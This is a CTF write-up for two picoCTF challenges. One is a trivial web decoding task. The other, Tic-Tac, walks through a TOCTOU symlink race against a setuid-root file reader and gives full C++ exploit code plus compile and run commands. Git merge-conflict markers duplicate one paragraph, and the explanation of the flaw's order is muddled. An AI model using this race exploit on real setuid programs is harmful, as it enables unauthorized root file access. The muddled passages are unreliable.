We're gonna start with the super easy stuff
## WebDecode
To me this seems pretty self explanatory. I first want to open up the inspector by either right clicking and clicking inspect element on the page or F12 on your keyboard. One of the first places I looked was to see if there was anything stored in the cookies.
<<<<<<< HEAD
![[cookies.png]]As you can see, there was nothing stored in the cookies. Maybe we can take a look at the HTML code of the page. You can look through the HTML code by going to Network and viewing the .html files that are loaded when loading up the website. You can look through elements, but any extensions you have installed can possibly inject itself into the webpage, adding extra html code that is not apart of the website itself. Snooping around, the html documents look normal to me, except for one page...
![[html.png]]This stands out among the rest because of this "notify_true" tag with these seemingly random combination of characteres and numbers. We can try decoding this using an application called CyberChef, which is kind of the swiss army knife for cyber. Loading up cyberchef, we need to drag the Magic operation into the Recipe. After that, we will paste that odd looking jumble of text into the Input box, then in the Output box should be our flag, which we can submit.![[cyberchef_actual.gif]]
=======
![[documentation/image1.png]]As you can see, there was nothing stored in the cookies. Maybe we can take a look at the HTML code of the page. You can look through the HTML code by going to Network and viewing the .html files that are loaded when loading up the website. You can look through elements, but any extensions you have installed can possibly inject itself into the webpage, adding extra html code that is not apart of the website itself. Snooping around, the html documents look normal to me, except for one page...
![[Pasted image 20240914151653.png]]This stands out among the rest because of this "notify_true" tag with these seemingly random combination of characteres and numbers. We can try decoding this using an application called CyberChef, which is kind of the swiss army knife for cyber. Loading up cyberchef, we need to drag the Magic operation into the Recipe. After that, we will paste that odd looking jumble of text into the Input box, then in the Output box should be our flag, which we can submit.![[chrome_MeFXbytID2.gif]]
>>>>>>> origin/main
Now that's really easy, lets delve into something harder.
# Tic-Tac
### Introduction:
In this challenge, we are looking at a program someone created to read text files. They don't know how safe the program is because they think that the program reads files with root privileges but they were told that it only accepts to read files by the user running it. In this challenge, we will analyze this file and exploit a bug in the application to read as root through a normal user.

## Important Terms!:
- ### TOCTOU (Time Of Check To Time Of Use) Bug

- **What it is**: A **race condition** where the state of a file can change between when a program checks its properties and when it uses the file.
- **How it works**: Imagine a program first checks if you have permission to access a file, but before it actually opens the file, you quickly change the file or its location. This allows you to trick the program into accessing something it shouldn’t.
- **Example**: The `txtreader` program checks if the file is owned by you and then opens it. If you quickly switch the file it’s pointing to (using a symlink), you can make it read a different file, like `flag.txt`.

### Setuid Bit

- **What it is**: A special permission for executable files. It allows the program to run with the permissions of the file owner (often root) rather than the permissions of the user who runs it.
- **How it works**: When a file has the setuid bit set, it can execute with the privileges of the file’s owner. For example, if `txtreader` is owned by root and has the setuid bit, it will run with root permissions, even if you are not root.
- **Example**: You run `txtreader` as a normal user, but because the setuid bit is set, it runs with root permissions, which can give it access to files owned by root.

### Symlink (Symbolic Link)

- **What it is**: A type of file that acts as a shortcut or pointer to another file or directory.
- **How it works**: When you create a symlink, you’re creating a reference that points to another file or directory. When you access the symlink, you’re actually accessing the target file or directory it points to.
- **Example**: If you create a symlink named `link.txt` that points to `actualfile.txt`, accessing `link.txt` will give you the contents of `actualfile.txt`.
### Preparation:
Assuming you already have a PicoCTF account, visit the link here for the challenge: https://play.picoctf.org/practice/challenge/380?difficulty=3&page=1. Make sure you are here!!!
![[things.png]]
Click the launch instance button then head over to the webshell:
![[signing_in_to_webshell.gif]]
Make sure when you are copying stuff to use ctrl+shift+v to paste it inside of the webshell.
## Analysis:
Now that we are in, lets take a look at the files we have. We will do that by running ls -lsa and you should see an output similar to this:
![[ls.png]]
For those who are unfamiliar to linux, we want to take a look at the txtreader file and its permissions assigned to it. -rwsr-xr-x. We want to specifically look at the s part of it, which the long version of it is setuid bit. This means that whatever user runs this program, they run it as root, so think of it as the person that has access to anything and everything inside of the system, while we have limited access. Even though we have this huge leverage with the application, we are still unable to read the flag owned by root. Lets look into the source code of the application.
![[source_code.png]]
This is the basic rundown of this script for if you don't know C++:
1. **Check Command-Line Arguments**:
    - The script expects exactly one command-line argument, which should be the name of a file. If the user does not provide the file name, it prints a usage message and exits.
2. **Retrieve File Information**:
    - The script retrieves the status information (such as ownership, permissions, etc.) of the specified file using the `stat()` system call.
    - If the `stat()` call fails (e.g., the file doesn't exist or there is a permissions issue), it prints an error message and exits.
3. **Check File Ownership**:
    - The script checks whether the file is owned by the current user by comparing the user ID of the file (`statbuf.st_uid`) with the current user's ID (`getuid()`).
    - If the file is not owned by the current user, it prints an error message and exits.
4. **Read and Display the File**:
    - If the file is owned by the user and the status information was successfully retrieved, the script attempts to open the file.
    - If the file can be opened, it reads the file line by line and prints each line to the standard output.
    - If the file cannot be opened, it prints an error message and exits.
Now this application has one major flaw... there are two steps inside of the application where the file is read, through std::ifstream and the stat() function. Because there are two steps, we have a small window in between these steps to try and abuse something since the file is already read before the user check is ran. Now it isn't as easy as just editing the source code because we cannot change the permissions of the application without root, so we have to try and do something to trick the application into reading a file it wasn't supposed to.
## Constructing the vulnerability:
With the two steps between reading the file and checking the ownership, we have a small window of time to somehow trick the app into reading something it shouldn't. We will implement a vulnerability known as a Time of Check to Time of Use bug. Somehow if we can swap the file in the small window of time to a file that we do own, but it still read the file that we don't own, then we will be able to read the flag.txt file that is owned by root.
Now, there is nothing you will grab from the code, as this application functions as intended, but "...we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it."

With that being said, we will create a **race condition** between the user check and reading the file. This is as it follows:
	> We create a dummy file that is owned by a user, then create a link to another file that we own
	> We run the txtreader program on the symlink, running a while loop to keep switching the link between the dummy file and the flag.txt file.
	> When the program checks who owns the file, it will see that the link we made goes to a file that we also own, but right before the program opens the file through the std::ifstream, the script will switch the link to point to flag.txt
	> When the timing is right, the program will read the flag file that it wasn't supposed to, getting past the ownership check.
We won't be able to create this script in bash, because the loop is too slow as I have already tried. We will continue with another c++ script as it was way faster in looping and we can get in time of the race condition to trick the application. 
## Create the script:
To create the script, open a new file in nano (a text editor)
```
nano racecondition.cpp
```
Copy the code below:
```
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>

int main(void) {
    // Create the dummy flag file
    FILE *fp = fopen("./dummy_flag.txt", "w");
    if (!fp) {
        return 1;
    }
    fputs("dummyFlag{just_a_place_holder}", fp);
    fclose(fp);

    // Start the attack
    bool droppedFlag = false;
    while (!droppedFlag) {
        // Step 1: Link target to the root-owned flag file
        unlink("./target.txt");
        symlink("./flag.txt", "./target.txt");

        // Fork the process
        pid_t pid = fork();
        if (pid == 0) {
            // Child process: execute txtreader with output redirection

            // Redirect output to output.txt
            int out_fd = open("output.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (out_fd == -1) {
                perror("open");
                return 1;
            }
            dup2(out_fd, STDOUT_FILENO);
            dup2(out_fd, STDERR_FILENO);
            close(out_fd);

            // Execute the txtreader binary
            execlp("./txtreader", "./txtreader", "./target.txt", NULL);
            _exit(1); // Only reached if execlp fails
        }

        // Introduce a small delay to help with race timing
        usleep(100); // Sleep for 100 microseconds, adjust based on your system's timing

        // Step 2: Replace symlink to point to dummy_flag.txt
        unlink("./target.txt");
        symlink("./dummy_flag.txt", "./target.txt");

        // Wait for the child process to complete
        int status;
        waitpid(pid, &status, 0);

        // Step 3: Read the redirected output, check if the flag was dumped
        fp = fopen("./output.txt", "r");
        if (fp) {
            char buf[100];
            if (fgets(buf, sizeof(buf), fp)) {
                if (strncmp(buf, "picoCTF", 7) == 0) {
                    droppedFlag = true;
                }
            }
            fclose(fp);
        }

        // Optional: reduce number of loop iterations for efficiency
        usleep(500);  // Sleep for a short period between iterations to avoid overloading the system
    }

    return 0;
}
```
Press ctrl+shift+v to paste it insde then press ctrl+s and then finally ctrl+x
then run this command
```
g++ racecondition.cpp -o grabflag
```
this will compile our script into a binary we can run
we then will run 
grabflag is the output binary from compilation.
Run the program
```
./grabflag
```
We then wait until the ctf-player@pico-chall shows back up
Visual representation:
![[demo.gif]]
We then finally view the output file
```
cat output.txt
```

Our flag should be there to submit.
